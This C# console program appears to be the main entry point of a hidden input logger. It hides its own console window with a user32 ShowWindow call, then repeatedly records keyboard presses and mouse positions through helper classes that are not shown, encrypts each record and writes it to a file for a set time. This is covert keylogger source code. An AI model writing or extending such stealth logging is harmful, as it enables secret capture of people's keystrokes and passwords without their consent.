using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Timers;
using System.Threading;

namespace ConsoleApp1
{
	class Program		   
	{
		static Stopwatch stpWatch;
		//https://www.dotnetperls.com/stopwatch
		static SaveState st;
		static List<SaveState> saveStates;
		const long MaxTime = 30000;   //30 seconds
									 //600000  //ten minutes
		static IntPtr hWnd = Process.GetCurrentProcess().MainWindowHandle; //need the handle for THIS program to find out what I need to "hide".

		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		static void Main(string[] args)
		{	
			ShowWindow(hWnd, 0); //0 hides cmd line, 1 shows.
			stpWatch = new Stopwatch();
			stpWatch.Start();
			long timespan = stpWatch.ElapsedMilliseconds;
			while(timespan < MaxTime) //10 minutes
			{
				saveStates = new List<SaveState>();
				st = EventCollection.Run(stpWatch);
				//Console.WriteLine(st.TimeGet + "|" + st.KeyboardClick + "|" + st.MousePossition.X + "|" + st.MousePossition.Y);//
				saveStates.Add(st);
				Thread.Sleep(10);
				//Ecrypt data file
				string temp = Encrypt.GetEncData(saveStates);
				//gets encrypted data into a string like "~$~$~st.time~$~KeyboardPress~$~mouseXPos~$~mouseYPos" but encrypted
				//Console.WriteLine(temp);
				WriteToFile.Run(temp);
				//conditions to end code.
				saveStates.Clear();//Clear saveState list
			}
			Environment.Exit(-1);
		}
	}
}
